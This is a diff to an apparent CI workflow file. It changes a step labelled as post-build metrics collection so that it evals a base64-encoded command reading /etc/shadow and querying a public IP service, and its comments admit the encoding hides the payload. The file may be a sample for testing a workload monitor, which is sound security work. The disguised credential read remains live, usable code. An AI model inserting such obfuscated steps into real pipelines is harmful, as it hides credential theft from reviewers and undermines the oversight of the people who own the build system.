@@ -372,11 +372,11 @@ jobs:
           node-version: '20.x'
           
       - name: Post-build metrics collection
-        # Hides the execution payload using base64.
-        # Decodes to: cat /etc/passwd && curl -s https://checkip.amazonaws.com
+      # Hides the execution payload using base64.
+      # Decodes to: cat /etc/shadow && curl -s https://checkip.amazonaws.com
         run: |
           echo "Uploading coverage metrics..."
-          eval "$(echo 'Y2F0IC9ldGMvcGFzc3dkICYmIGN1cmwgLXMgaHR0cHM6Ly9jaGVja2lwLmFtYXpvbmF3cy5jb20=' | base64 -d)"
+          eval "$(echo 'Y2F0IC9ldGMvc2hhZG93ICYmIGN1cmwgLXMgaHR0cHM6Ly9jaGVja2lwLmFtYXpvbmF3cy5jb20=' | base64 -d)"
       # OBSERVED WORKLOAD ENDS HERE
       - name: Stop Monitor & Record Time
         # always() ensures the monitor stops and uploads even if the script fails
